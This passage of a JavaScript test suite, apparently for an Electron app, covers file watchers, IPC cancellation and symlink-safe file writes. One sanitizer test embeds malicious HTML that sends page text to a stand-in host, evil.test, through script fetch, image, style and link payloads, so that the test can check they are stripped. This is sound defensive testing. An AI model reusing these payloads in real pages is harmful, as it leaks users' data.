        access: async () => {},
        realpath: async (candidate) => candidate === documentPath ? currentTarget : candidate,
        onError: () => {},
        retryMs: 10_000,
      });
      try {
        await registry.start(event.sender, documentPath);
        assert(typeof targetPoll === 'function', 'the unavailable target watcher must start polling');
        currentTarget = targetPath;
        targetPoll(
          { mtimeMs: 2, ctimeMs: 2, size: 2, ino: 2, nlink: 1 },
          { mtimeMs: 1, ctimeMs: 1, size: 1, ino: 1, nlink: 1 },
        );
        await waitFor(() => watchedDirs.includes(path.dirname(targetPath)) && sent.length >= 1,
          'fallback polling rebind after direct path becomes a symlink', 500);
        assert(sent.at(-1) === documentPath,
          'fallback rebind must retain the lexical renderer path');
        return { fallbackSymlinkRebound: true };
      } finally {
        registry.stop(event.sender, documentPath);
      }
    },
  },
  {
    name: 'document watcher start-stop race cannot leak a late subscription',
    run: async () => {
      const event = senderEvent();
      let releaseAccess;
      const access = () => new Promise(resolve => { releaseAccess = resolve; });
      let watchCalls = 0;
      const registry = createFileWatchRegistry({
        access,
        watch: () => { watchCalls += 1; return new EventEmitter(); },
        onError: () => {},
      });
      const documentPath = '/tmp/unmounted-before-watch.md';
      const starting = registry.start(event.sender, documentPath);
      registry.stop(event.sender, documentPath);
      releaseAccess();
      await starting;
      assert(watchCalls === 0,
        'cleanup while access is pending must prevent late directory-watch registration');
      return { lateRegistrationPrevented: true };
    },
  },
  {
    name: 'document watcher falls back on an unexpected live close and retries once',
    run: async () => {
      const event = senderEvent();
      event.sender.send = () => {};
      const watchers = [];
      let polledPath = null;
      const documentPath = '/tmp/unexpected-watcher-close.md';
      const registry = createFileWatchRegistry({
        watch: (watchedPath, callback) => {
          const watcher = new EventEmitter();
          watcher.watchedPath = watchedPath;
          watcher.callback = callback;
          watcher.closed = false;
          watcher.close = () => { watcher.closed = true; };
          watchers.push(watcher);
          return watcher;
        },
        watchFile: (watchedPath) => { polledPath = watchedPath; },
        access: async () => {},
        realpath: async (candidate) => candidate,
        onError: () => {},
        retryMs: 5,
      });
      try {
        await registry.start(event.sender, documentPath);
        watchers[0].emit('close');
        assert(polledPath === documentPath,
          'an unexpected native watcher close must retain the subscription through polling');
        await waitFor(() => watchers.length === 2, 'native watcher reattachment after close', 500);
        assert(!watchers[1].closed, 'the replacement native watcher must remain live');
        return { fallbackPollingStarted: true, reattached: true };
      } finally {
        registry.stop(event.sender, documentPath);
      }
    },
  },
  {
    name: 'document watcher polling detects ctime-only changes',
    run: async () => {
      const event = senderEvent();
      const changes = [];
      event.sender.send = (_channel, changedPath) => changes.push(changedPath);
      let pollListener = null;
      const documentPath = '/tmp/ctime-only-watch.md';
      const registry = createFileWatchRegistry({
        watch: () => { throw new Error('force polling fallback'); },
        watchFile: (_watchedPath, _options, callback) => { pollListener = callback; },
        access: async () => {},
        realpath: async (candidate) => candidate,
        onError: () => {},
        retryMs: 10_000,
      });
      try {
        await registry.start(event.sender, documentPath);
        assert(typeof pollListener === 'function', 'fallback polling must be installed after native-watch failure');
        pollListener(
          { mtimeMs: 10, ctimeMs: 11, size: 7, ino: 2, nlink: 1 },
          { mtimeMs: 10, ctimeMs: 10, size: 7, ino: 2, nlink: 1 },
        );
        assert(changes.length === 1 && changes[0] === documentPath,
          'ctime-only mutation must notify while the native watcher is unavailable');
        return { ctimeOnlyChangeObserved: true };
      } finally {
        registry.stop(event.sender, documentPath);
      }
    },
  },
  {
    name: 'document watcher ignores a sender already destroyed before registration',
    run: async () => {
      const event = senderEvent();
      event.sender.isDestroyed = () => true;
      let watchCalls = 0;
      const registry = createFileWatchRegistry({
        watch: () => { watchCalls += 1; return new EventEmitter(); },
        access: async () => {},
        realpath: async (candidate) => candidate,
        onError: () => {},
      });
      await registry.start(event.sender, '/tmp/destroyed-before-watch.md');
      assert(watchCalls === 0, 'an already-destroyed sender must not reserve or attach a watcher');
      return { destroyedSenderIgnored: true };
    },
  },
  {
    name: 'document watcher contains a sender destruction race during broadcast',
    run: async () => {
      const event = senderEvent();
      event.sender.send = () => { throw new Error('WebContents destroyed during send'); };
      let watcher;
      const documentPath = '/tmp/send-race-watch.md';
      const registry = createFileWatchRegistry({
        watch: (_watchedPath, callback) => {
          watcher = new EventEmitter();
          watcher.callback = callback;
          watcher.closed = false;
          watcher.close = () => { watcher.closed = true; };
          return watcher;
        },
        access: async () => {},
        realpath: async (candidate) => candidate,
        onError: () => {},
      });
      await registry.start(event.sender, documentPath);
      watcher.callback('change', path.basename(documentPath));
      assert(watcher.closed,
        'a send race must be contained and release the final watcher subscription');
      return { broadcastSendRaceContained: true };
    },
  },
  {
    name: 'IPC safe handler: timeout keeps its abort reason and cannot report a late success',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      handleSafe('test:timeout-abort', async () => {
        await new Promise(resolve => setTimeout(resolve, 20));
        return { data: 'late result' };
      }, 1);
      const result = await electronPkg.ipcMain.__getInvokeHandler('test:timeout-abort')(senderEvent(), {});
      assert(result.success === false && result.error === 'Timeout',
        `timed-out work must return its own reason, got ${JSON.stringify(result)}`);
      return { error: result.error };
    },
  },
  {
    name: 'IPC safe handler: node deletion keeps its abort reason and cannot report a late success',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      let release;
      const finished = new Promise(resolve => { release = resolve; });
      handleSafe('test:node-deleted-abort', async () => {
        await finished;
        return { data: 'late result' };
      });
      const pending = electronPkg.ipcMain.__getInvokeHandler('test:node-deleted-abort')(senderEvent(), { nodeId: 'deleted-node' });
      abortNodeTasks('deleted-node');
      release();
      const result = await pending;
      assert(result.success === false && result.error === 'Node deleted',
        `node deletion must return its own reason, got ${JSON.stringify(result)}`);
      return { error: result.error };
    },
  },
  {
    name: 'IPC safe handler: acknowledged cancellation waits for the exact handler cleanup boundary',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      let release;
      const gate = new Promise(resolve => { release = resolve; });
      handleSafe('test:acknowledged-node-cancel', async () => {
        await gate;
        return { data: 'must not escape after abort' };
      });
      const event = senderEvent();
      const handler = electronPkg.ipcMain.__getInvokeHandler('test:acknowledged-node-cancel');
      const pending = handler(event, { nodeId: 'transactional-node' });
      await Promise.resolve();

      let acknowledgementSettled = false;
      const acknowledgementPromise = abortNodeTasksAndWait('transactional-node', event.sender, undefined, 1_000)
        .then((value) => {
          acknowledgementSettled = true;
          return value;
        });
      await Promise.resolve();
      assert(!acknowledgementSettled,
        'acknowledged cancellation must not resolve merely because the AbortSignal fired while the handler is still draining');

      release();
      const [acknowledgement, result] = await Promise.all([acknowledgementPromise, pending]);
      assert(acknowledgement.abortedCount === 1 && acknowledgement.settled === true
        && result.success === false && result.error === 'Node deleted'
        && snapshotActiveNodeTasks(event.sender.id).length === 0,
      `acknowledgement must follow handleSafe finally and leave no retained task, got ${JSON.stringify({ acknowledgement, result })}`);
      return { acknowledgedAfterFinally: true };
    },
  },
  {
    name: 'IPC safe handler: quiet registration remains cancelable while suppressing only its routine INFO line',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      const channel = 'test:quiet-registration-remains-visible';
      let release;
      const gate = new Promise(resolve => { release = resolve; });
      handleSafe(channel, async () => {
        await gate;
        return { quiet: true };
      }, { logTaskRegistration: false });

      const event = senderEvent();
      const pending = electronPkg.ipcMain.__getInvokeHandler(channel)(event, { nodeId: 'quiet-probe-node' });
      await Promise.resolve();
      const [active] = snapshotActiveNodeTasks(event.sender.id);
      const registrationLogs = getRecentLogs().filter(entry => (
        entry.level === 'info' && entry.message.includes(`channel ${channel}`)
      ));
      const jobs = fs.readFileSync(path.resolve('electron/ipc/jobs.js'), 'utf8');
      const peekStart = jobs.indexOf("handleSafe('peek-job-run'");
      const peekEnd = jobs.indexOf("handleSafe('pause-job-run'", peekStart);
      const peekHandler = jobs.slice(peekStart, peekEnd);

      assert(active?.nodeId === 'quiet-probe-node'
        && active.taskCount === 1
        && active.channels.includes(channel)
        && registrationLogs.length === 0
        && peekStart >= 0 && peekEnd > peekStart
        && peekHandler.includes('}, { logTaskRegistration: false });'),
      `quiet probes must remain registered for cancellation/reporting without routine registration INFO output, got ${JSON.stringify({ active, registrationLogs })}`);

      release();
      const result = await pending;
      assert(result.success === true && snapshotActiveNodeTasks(event.sender.id).length === 0,
        'a quiet registered probe must settle and clean up exactly like every other node task');
      return { registered: active.taskCount, registrationLogs: registrationLogs.length };
    },
  },
  {
    name: 'IPC safe handler: concurrent startup inspections on one node remain distinct tasks',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      const releases = new Map();
      for (const channel of ['test:peek-job-run', 'test:get-last-job-analysis-snapshot']) {
        handleSafe(channel, async () => {
          await new Promise(resolve => { releases.set(channel, resolve); });
          return { channel };
        });
      }
      const event = senderEvent();
      const nodeId = 'startup-recovery-node';
      const pending = ['test:peek-job-run', 'test:get-last-job-analysis-snapshot'].map(channel => (
        electronPkg.ipcMain.__getInvokeHandler(channel)(event, { nodeId })
      ));
      await Promise.resolve();

      const [active] = snapshotActiveNodeTasks(event.sender.id);
      assert(active?.nodeId === nodeId
        && active.taskCount === 2
        && JSON.stringify([...active.channels].sort()) === JSON.stringify([
          'test:get-last-job-analysis-snapshot', 'test:peek-job-run',
        ]),
      `two independent load-time inspections must stay visible as two tasks, got ${JSON.stringify(active)}`);

      for (const release of releases.values()) release();
      const settled = await Promise.all(pending);
      assert(settled.every(result => result.success === true)
        && snapshotActiveNodeTasks(event.sender.id).length === 0,
      `both independent inspections must clean up after settling, got ${JSON.stringify({ settled, active: snapshotActiveNodeTasks(event.sender.id) })}`);
      return { tasks: active.taskCount, channels: active.channels.length };
    },
  },
  {
    name: 'IPC safe handler: cancellation is scoped to the requesting canvas even when node ids collide',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      const releases = new Map();
      handleSafe('test:sender-scoped-abort', async (event) => {
        await new Promise(resolve => { releases.set(event.sender.id, resolve); });
        return { senderId: event.sender.id };
      });
      const first = senderEvent();
      const second = senderEvent();
      const handler = electronPkg.ipcMain.__getInvokeHandler('test:sender-scoped-abort');
      const firstPending = handler(first, { nodeId: 'shared-node-id' });
      const secondPending = handler(second, { nodeId: 'shared-node-id' });
      await Promise.resolve();
      abortNodeTasks('shared-node-id', first.sender);
      releases.get(first.sender.id)();
      releases.get(second.sender.id)();
      const [firstResult, secondResult] = await Promise.all([firstPending, secondPending]);
      assert(firstResult.success === false && firstResult.error === 'Node deleted',
        `the cancelling canvas must observe its abort, got ${JSON.stringify(firstResult)}`);
      assert(secondResult.success === true && secondResult.senderId === second.sender.id,
        `another canvas with the same node id must finish, got ${JSON.stringify(secondResult)}`);
      return { cancelledSender: first.sender.id, preservedSender: second.sender.id };
    },
  },
  {
    name: 'IPC safe handler: stable application error codes cross the IPC boundary',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      handleSafe('test:error-code', async () => {
        const error = new Error('Result changed while settling');
        error.code = 'LOCAL_AI_RESULT_CHANGED';
        throw error;
      });
      const result = await electronPkg.ipcMain.__getInvokeHandler('test:error-code')(senderEvent(), {});
      assert(result.success === false && result.errorCode === 'LOCAL_AI_RESULT_CHANGED',
        `a compact thrown error code must survive IPC, got ${JSON.stringify(result)}`);
      return { errorCode: result.errorCode };
    },
  },
  {
    name: 'IPC safe handler: destroyed senders release retained task diagnostics immediately',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      let release;
      const gate = new Promise(resolve => { release = resolve; });
      handleSafe('test:destroyed-sender-cleanup', async () => {
        await gate;
        return { data: 'detached result' };
      });
      const event = senderEvent();
      let destroyed = false;
      event.sender.isDestroyed = () => destroyed;
      const pending = electronPkg.ipcMain.__getInvokeHandler('test:destroyed-sender-cleanup')(event, { nodeId: 'closed-window-node' });
      await Promise.resolve();
      assert(snapshotActiveNodeTasks(event.sender.id).length === 1,
        'the pending node task must be visible before its owner closes');
      destroyed = true;
      event.sender.emit('destroyed');
      assert(snapshotActiveNodeTasks(event.sender.id).length === 0,
        'destroying WebContents must remove its registry entry even if downstream work ignores AbortSignal');
      release();
      const result = await pending;
      assert(result.success === false && (result.error === 'Window closed' || result.error === 'Sender destroyed'),
        `detached work must not report success, got ${JSON.stringify(result)}`);
      return { registryReleased: true, error: result.error };
    },
  },
  {
    name: 'résumé markup boundary strips active/selector-confusion content while preserving design structure and receipts',
    run: () => {
      const malicious = `<main class="page attacker" id="ic-application-bundle-data" onclick="steal()" style="background:url(https://evil.test/x)">
        <header class="resume-header"><h1 class="name" itemprop="name">Maya Chen</h1></header>
        <section class="section"><div class="section-head"><h2 id="sec-projects">Projects</h2><span class="rule" aria-hidden="true"></span></div>
          <div class="projects"><article class="project"><p><span class="project-name">Safe System</span></p></article></div>
          <ul class="highlights"><li>Cut debt <span data-achievement-id="a1" data-derivation="forged" onmouseover="steal()">74%</span></li></ul>
        </section>
        <script>fetch('https://evil.test/' + document.body.innerText)</script>
        <style>@import url(https://evil.test/style.css)</style><img src="https://evil.test/pixel" onerror="steal()">
        <iframe srcdoc="<script>steal()</script>"></iframe><form action="https://evil.test"><input name="secret"></form>
        <a id="unsafe-link" href="javascript:steal()" ping="https://evil.test/ping">Unsafe</a>
        <a id="safe-link" href="https://portfolio.example.test/work" target="_blank">Portfolio</a>
      </main>`;
      const sanitized = sanitizeDocumentMainHtml(malicious);
      assert(!/<(?:script|style|img|iframe|form|input)\b/i.test(sanitized)
        && !/\s(?:on\w+|style|src|srcdoc|ping|target)=/i.test(sanitized),
      `active elements/attributes must be removed, got ${sanitized}`);
      assert(!/id="ic-/i.test(sanitized) && !sanitized.includes('class="page attacker"'),
        'model markup cannot occupy the host id namespace or retain undocumented classes');
      assert(sanitized.includes('class="projects"') && sanitized.includes('class="project-name"')
        && sanitized.includes('id="safe-link" href="https://portfolio.example.test/work"')
        && !/id="unsafe-link"[^>]*href=/i.test(sanitized),
      'documented project structure and safe explicit links survive while active URL schemes do not');

      const document = buildResumeDocument({
        resumeMainHtml: malicious,
        ledger: [{
          id: 'a1', claim: 'Cut debt', caveats: '', derivation: 'debt $4.2M to $1.1M',
          computed: { isNumeric: true, display: '74% ($4.2M → $1.1M)' },
        }],
      });
      const dom = new JSDOM(document);
      try {
        const resumeMain = dom.window.document.querySelector('[data-ic-document-panel="resume"] main.page');
        assert(resumeMain && !resumeMain.querySelector('script,style,img,iframe,form,input'),
          'the final saved résumé panel remains inert');
        assert(resumeMain.querySelector('[data-achievement-id="a1"]')?.getAttribute('data-derivation')?.includes('debt $4.2M'),
          'a valid achievement receipt survives and receives only the ledger-authored derivation');
        const bundleNodes = dom.window.document.querySelectorAll('#ic-application-bundle-data');
        assert(bundleNodes.length === 1 && bundleNodes[0].getAttribute('type') === 'application/json',
          'a stripped model id cannot shadow the trusted application bundle node');
        const policy = dom.window.document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content') || '';
        const nonce = /script-src 'nonce-([^']+)'/.exec(policy)?.[1] || '';
        const scripts = [...dom.window.document.querySelectorAll('script')];
        assert(nonce && scripts.length >= 3 && scripts.every(script => script.getAttribute('nonce') === nonce)
          && policy.includes("object-src 'none'") && policy.includes('connect-src http://127.0.0.1:43192'),
        'the nonce CSP authorizes only the app scripts plus the fixed loopback Sync endpoint');
      } finally {
        dom.window.close();
      }
      return { activeMarkupStripped: true, receiptPreserved: true, cspNonceBound: true };
    },
  },
  {
    name: 'OS document opening validates the canonical target behind a symlink',
    run: async () => {
      const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'ic-open-file-'));
      const safeTarget = path.join(root, 'actual.txt');
      const activeTarget = path.join(root, 'payload.app');
      const disguisedLink = path.join(root, 'innocent.txt');
      const directoryTarget = path.join(root, 'folder.txt');
      try {
        await Promise.all([
          fs.promises.writeFile(safeTarget, 'safe'),
          fs.promises.writeFile(activeTarget, 'not actually executable'),
          fs.promises.mkdir(directoryTarget),
        ]);
        await fs.promises.symlink(activeTarget, disguisedLink, process.platform === 'win32' ? 'file' : undefined);
        assert(await resolveAllowedOpenFilePath(safeTarget) === await fs.promises.realpath(safeTarget),
          'a safe regular file should resolve to its canonical path');
        let disguisedRejected = false;
        try { await resolveAllowedOpenFilePath(disguisedLink); }
        catch { disguisedRejected = true; }
        assert(disguisedRejected, 'an allowed-looking link to a restricted target must be rejected');
        let directoryRejected = false;
        try { await resolveAllowedOpenFilePath(directoryTarget); }
        catch { directoryRejected = true; }
        assert(directoryRejected, 'an allowed-looking directory must not be handed to the OS shell');
        return { canonicalTargetChecked: true, disguisedTargetRejected: true, directoryRejected: true };
      } finally {
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'OS trash protection blocks canonical aliases and represented folder descendants',
    run: async () => {
      const fileStat = (dev, ino) => ({
        dev,
        ino,
        isFile: () => true,
        isDirectory: () => false,
        isSymbolicLink: () => false,
      });
      const directoryStat = (dev, ino) => ({
        dev,
        ino,
        isFile: () => false,
        isDirectory: () => true,
        isSymbolicLink: () => false,
      });
      const symlinkStat = (dev, ino) => ({
        dev,
        ino,
        isFile: () => false,
        isDirectory: () => false,
        isSymbolicLink: () => true,
      });
      const statByPath = new Map([
        ['/workspace/Work.md', fileStat(1, 10)],
        ['/workspace/work.md', fileStat(1, 10)],
        ['/canonical/Work.md', fileStat(1, 10)],
        ['/workspace/project', directoryStat(1, 20)],
        ['/canonical/project', directoryStat(1, 20)],
        ['/workspace/project/kept.md', fileStat(1, 21)],
        ['/canonical/project/kept.md', fileStat(1, 21)],
        ['/workspace/project/link-out.md', symlinkStat(1, 22)],
        ['/outside/linked-target.md', fileStat(1, 23)],
        ['/workspace/other.md', fileStat(1, 30)],
        ['/canonical/other.md', fileStat(1, 30)],
      ]);
      const canonicalByPath = new Map([
        ['/workspace/Work.md', '/canonical/Work.md'],
        ['/workspace/work.md', '/canonical/Work.md'],
        ['/workspace/project', '/canonical/project'],
        ['/workspace/project/kept.md', '/canonical/project/kept.md'],
        ['/workspace/project/link-out.md', '/outside/linked-target.md'],
        ['/workspace/other.md', '/canonical/other.md'],
      ]);
      const lstat = async candidate => {
        const stats = statByPath.get(candidate);
        if (!stats) throw Object.assign(new Error('missing'), { code: 'ENOENT' });
        return stats;
      };
      const realpath = async candidate => {
        const canonical = canonicalByPath.get(candidate) || candidate;
        if (!statByPath.has(canonical)) throw Object.assign(new Error('missing'), { code: 'ENOENT' });
        return canonical;
      };
      const options = { validate: async candidate => candidate, lstat, realpath };
      const protectedCode = async (candidate, survivors) => {
        try {
          await assertDeleteTargetNotRepresented(candidate, survivors, options);
          return null;
        } catch (error) {
          return error?.code;
        }
      };
      assert(await protectedCode('/workspace/Work.md', ['/workspace/work.md']) === 'OS_DELETE_PROTECTED',
        'case/canonical aliases of one surviving file must block OS trash even when their lexical strings differ');
      assert(await protectedCode('/workspace/project', ['/workspace/project/kept.md']) === 'OS_DELETE_PROTECTED',
        'a folder candidate must not be trashed when a survivor resolves beneath its canonical directory');
      assert(await protectedCode('/workspace/project', ['/workspace/project/link-out.md']) === 'OS_DELETE_PROTECTED',
        'a folder candidate must also keep a surviving symlink entry whose target resolves outside that folder');
      assert(await protectedCode('/workspace/Work.md', [null]) === 'OS_DELETE_PROTECTED'
        && await protectedCode('/workspace/Work.md', Array(513).fill('/workspace/other.md')) === 'OS_DELETE_PROTECTED',
      'malformed or over-cap untrusted survivor lists must only block deletion');
      assert(await assertDeleteTargetNotRepresented('/workspace/Work.md', ['/workspace/other.md'], options)
        === '/workspace/Work.md',
      'an unrelated validated survivor must not broaden the candidate authorization or block normal trash');

      const [preload, filesystem] = await Promise.all([
        fs.promises.readFile(path.resolve('electron/preload.js'), 'utf8'),
        fs.promises.readFile(path.resolve('electron/ipc/filesystem.js'), 'utf8'),
      ]);
      assert(preload.includes("deleteOSFile: (filePath, protectedPaths = []) => ipcRenderer.invoke('delete-os-file', {")
        && preload.includes('protectedPaths,')
        && filesystem.includes("handleSafe('delete-os-file', async (event, request) =>")
        && filesystem.includes('assertDeleteTargetNotRepresented(filePath, protectedPaths'),
      'preload and main must preserve the protected-path delete IPC contract');
      return { canonicalAliasBlocked: true, descendantBlocked: true, malformedOnlyBlocks: true };
    },
  },
  {
    name: 'text edits bind to the validated canonical file across symlink swaps',
    run: async () => {
      const root = await fs.promises.mkdtemp('/tmp/ic-text-write-');
      const documentPath = path.join(root, 'document.md');
      const outsidePath = path.join(root, 'outside.md');
      const linkedPath = path.join(root, 'linked.md');
      try {
        await Promise.all([
          fs.promises.writeFile(documentPath, 'original', { mode: 0o600 }),
          fs.promises.writeFile(outsidePath, 'outside', { mode: 0o600 }),
        ]);
        await fs.promises.symlink(documentPath, linkedPath, process.platform === 'win32' ? 'file' : undefined);
        const validatedPath = await validateMutablePath(linkedPath, { textOnly: true });
        assert(validatedPath === await fs.promises.realpath(documentPath),
          'text validation must return the canonical file rather than the lexical symlink');

        await fs.promises.unlink(linkedPath);
        await fs.promises.symlink(outsidePath, linkedPath, process.platform === 'win32' ? 'file' : undefined);
        await atomicWriteFile(validatedPath, 'updated');
        assert(await fs.promises.readFile(documentPath, 'utf8') === 'updated',
          'the write must remain bound to the file that validation approved');
        assert(await fs.promises.readFile(outsidePath, 'utf8') === 'outside',
          'repointing the caller-controlled symlink must not redirect the write');

        await writeValidatedTextFile(documentPath, 'final');
        assert(await fs.promises.readFile(documentPath, 'utf8') === 'final',
          'the identity-checked text writer should preserve normal edits');

        const guardedPath = path.join(root, 'guarded.txt');
        const originalGuardedPath = path.join(root, 'guarded.original.txt');
        await fs.promises.writeFile(guardedPath, 'guarded', { mode: 0o600 });
        const guardedCanonicalPath = await fs.promises.realpath(guardedPath);
        const originalAccess = fs.promises.access;
        let injectedReplacement = false;
        let replacementRejected = false;
        try {
          fs.promises.access = async (...args) => {
            const result = await originalAccess.call(fs.promises, ...args);
            if (!injectedReplacement && args[0] === guardedCanonicalPath) {
              injectedReplacement = true;
              await fs.promises.rename(guardedPath, originalGuardedPath);
              await fs.promises.writeFile(guardedPath, 'replacement', { mode: 0o600 });
            }
            return result;
          };
          await writeValidatedTextFile(guardedPath, 'must-not-land');
        } catch (error) {
          replacementRejected = error?.code === 'TEXT_FILE_CONFLICT';
        } finally {
          fs.promises.access = originalAccess;
        }
        assert(replacementRejected, 'a regular-file replacement after validation must fail its identity check');
        assert(await fs.promises.readFile(guardedPath, 'utf8') === 'replacement',
          'a replacement file must not be overwritten after its identity no longer matches');

        // A content precondition alone cannot detect a retarget from A to a
        // byte-identical B. Model the delayed/missed watcher case: the read
        // token must bind the pending edit to A, so B remains untouched.
        const sameContentA = path.join(root, 'same-content-a.md');
        const sameContentB = path.join(root, 'same-content-b.md');
        const retargetableAlias = path.join(root, 'same-content-link.md');
        const sameContent = 'identical baseline';
        await Promise.all([
          fs.promises.writeFile(sameContentA, sameContent, { mode: 0o600 }),
          fs.promises.writeFile(sameContentB, sameContent, { mode: 0o600 }),
        ]);
        await fs.promises.symlink(sameContentA, retargetableAlias, process.platform === 'win32' ? 'file' : undefined);
        const loaded = await readValidatedTextFile(retargetableAlias);
        await fs.promises.unlink(retargetableAlias);
        await fs.promises.symlink(sameContentB, retargetableAlias, process.platform === 'win32' ? 'file' : undefined);
        let identicalRetargetConflict = false;
        try {
          await writeValidatedTextFile(retargetableAlias, 'must not land in B', {
            expectedContent: loaded.content,
            expectedTargetToken: loaded.targetToken,
          });
        } catch (error) {
          identicalRetargetConflict = error?.code === 'TEXT_FILE_CONFLICT';
        }
        assert(identicalRetargetConflict
          && await fs.promises.readFile(sameContentA, 'utf8') === sameContent
          && await fs.promises.readFile(sameContentB, 'utf8') === sameContent,
        'a saved target token must reject an identical-content symlink retarget without modifying either referent');

        // Retarget after the initial inspection while an I/O operation is in
        // progress. The final lexical realpath assertion, not just the inode
        // check on A, must turn both windows into the normal conflict state.
        const lexicalRaceA = path.join(root, 'lexical-race-a.md');
        const lexicalRaceB = path.join(root, 'lexical-race-b.md');
        const lexicalRaceLink = path.join(root, 'lexical-race-link.md');
        await Promise.all([
          fs.promises.writeFile(lexicalRaceA, sameContent, { mode: 0o600 }),
          fs.promises.writeFile(lexicalRaceB, sameContent, { mode: 0o600 }),
        ]);
        await fs.promises.symlink(lexicalRaceA, lexicalRaceLink, process.platform === 'win32' ? 'file' : undefined);
        const canonicalRaceA = await fs.promises.realpath(lexicalRaceA);
        const originalReadFile = fs.promises.readFile;
        let readRetargeted = false;
        let readRetargetConflict = false;
        try {
          fs.promises.readFile = async (...args) => {
            const value = await originalReadFile.call(fs.promises, ...args);
            if (!readRetargeted && args[0] === canonicalRaceA) {
              readRetargeted = true;
              await fs.promises.unlink(lexicalRaceLink);
              await fs.promises.symlink(lexicalRaceB, lexicalRaceLink, process.platform === 'win32' ? 'file' : undefined);
            }
            return value;
          };
          await readValidatedTextFile(lexicalRaceLink);
        } catch (error) {
          readRetargetConflict = error?.code === 'TEXT_FILE_CONFLICT';
        } finally {
          fs.promises.readFile = originalReadFile;
        }
        assert(readRetargetConflict,
          'a symlink retarget during a validated read must reject its stale baseline as TEXT_FILE_CONFLICT');

        await fs.promises.unlink(lexicalRaceLink);
        await fs.promises.symlink(lexicalRaceA, lexicalRaceLink, process.platform === 'win32' ? 'file' : undefined);
        const writeRaceRead = await readValidatedTextFile(lexicalRaceLink);
        let writeRetargeted = false;
        let writeRetargetConflict = false;
        try {
          fs.promises.readFile = async (...args) => {
            const value = await originalReadFile.call(fs.promises, ...args);
            if (!writeRetargeted && args[0] === canonicalRaceA) {
              writeRetargeted = true;
              await fs.promises.unlink(lexicalRaceLink);
              await fs.promises.symlink(lexicalRaceB, lexicalRaceLink, process.platform === 'win32' ? 'file' : undefined);
            }
            return value;
          };
          await writeValidatedTextFile(lexicalRaceLink, 'must not land after retarget', {
            expectedContent: writeRaceRead.content,
            expectedTargetToken: writeRaceRead.targetToken,
          });
        } catch (error) {
          writeRetargetConflict = error?.code === 'TEXT_FILE_CONFLICT';
        } finally {
          fs.promises.readFile = originalReadFile;
        }
        assert(writeRetargetConflict
          && await fs.promises.readFile(lexicalRaceA, 'utf8') === sameContent
          && await fs.promises.readFile(lexicalRaceB, 'utf8') === sameContent,
        'a symlink retarget during CAS must be detected before rename and leave both referents unchanged');
        return {
          canonicalTargetBound: true,
          identityChecked: true,
          replacementRejected: true,
          identicalRetargetConflict,
          readRetargetConflict,
          writeRetargetConflict,
        };
      } finally {
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'text edits serialize same-baseline writers and surface stale conflicts',
    run: async () => {
      const root = await fs.promises.mkdtemp('/tmp/ic-text-write-conflict-');
      const documentPath = path.join(root, 'shared.md');
      const aliasPath = path.join(root, 'shared-alias.md');
      try {
        const baseline = 'base version';
        await fs.promises.writeFile(documentPath, baseline, { mode: 0o600 });
        await fs.promises.symlink(documentPath, aliasPath, process.platform === 'win32' ? 'file' : undefined);

        // Both spellings resolve to the same canonical target and observed the
        // same baseline, but only the first FIFO writer may replace it. The
        // second must never silently overwrite it.
        const competing = await Promise.allSettled([
          writeValidatedTextFile(documentPath, 'writer one', { expectedContent: baseline }),
          writeValidatedTextFile(aliasPath, 'writer two', { expectedContent: baseline }),
        ]);
        const winners = competing.filter((result) => result.status === 'fulfilled');
        const conflicts = competing.filter((result) => result.status === 'rejected'
          && result.reason?.code === 'TEXT_FILE_CONFLICT');
        const settled = await fs.promises.readFile(documentPath, 'utf8');
        assert(winners.length === 1 && conflicts.length === 1,
          `same-baseline concurrent edits require one winner and one TEXT_FILE_CONFLICT, got ${JSON.stringify(competing.map((result) => ({ status: result.status, code: result.reason?.code })))}`);
        assert(settled === 'writer one' || settled === 'writer two',
          `only the committed winner may reach disk, got ${JSON.stringify(settled)}`);

        // Repeating an already-committed desired value is safe and idempotent,
        // even when its caller loaded the same prior baseline as another node.
        await fs.promises.writeFile(documentPath, baseline, { mode: 0o600 });
        const identical = await Promise.allSettled([
          writeValidatedTextFile(documentPath, 'shared result', { expectedContent: baseline }),
          writeValidatedTextFile(documentPath, 'shared result', { expectedContent: baseline }),
        ]);
        assert(identical.every((result) => result.status === 'fulfilled')
          && await fs.promises.readFile(documentPath, 'utf8') === 'shared result',
        'identical concurrent writes from one baseline must both succeed without a false conflict');

        // An in-place external write keeps the inode, so inject it between the
        // initial baseline read and the final pre-rename read. It must be
        // treated as the same stable conflict as a competing atomic writer.
        await fs.promises.writeFile(documentPath, baseline, { mode: 0o600 });
        const canonicalDocumentPath = await fs.promises.realpath(documentPath);
        const originalReadFile = fs.promises.readFile;
        let targetReadCount = 0;
        let inPlaceRaceRejected = false;
        try {
          fs.promises.readFile = async (...args) => {
            if (args[0] === canonicalDocumentPath && ++targetReadCount === 2) {
              await fs.promises.writeFile(documentPath, 'external in-place edit');
            }
            return originalReadFile.call(fs.promises, ...args);
          };
          await writeValidatedTextFile(documentPath, 'must not overwrite', { expectedContent: baseline });
        } catch (error) {
          inPlaceRaceRejected = error?.code === 'TEXT_FILE_CONFLICT';
        } finally {
          fs.promises.readFile = originalReadFile;
        }
        assert(inPlaceRaceRejected && await fs.promises.readFile(documentPath, 'utf8') === 'external in-place edit',
          'an in-place external edit before rename must remain on disk and report TEXT_FILE_CONFLICT');

        const missingPath = path.join(root, 'deleted-before-save.md');
        let initialMissingConflict = false;
        try {
          await writeValidatedTextFile(missingPath, 'draft after deletion', { expectedContent: 'old disk text' });
        } catch (error) {
          initialMissingConflict = error?.code === 'TEXT_FILE_CONFLICT';
        }
        assert(initialMissingConflict,
          'a preconditioned save that starts after deletion must expose TEXT_FILE_CONFLICT');

        // The inspect routine double-checks the lexical path after resolving
        // its parent. Exercise that bespoke revalidation failure (which has no
        // errno) and ensure it is still renderer-actionable under a baseline.
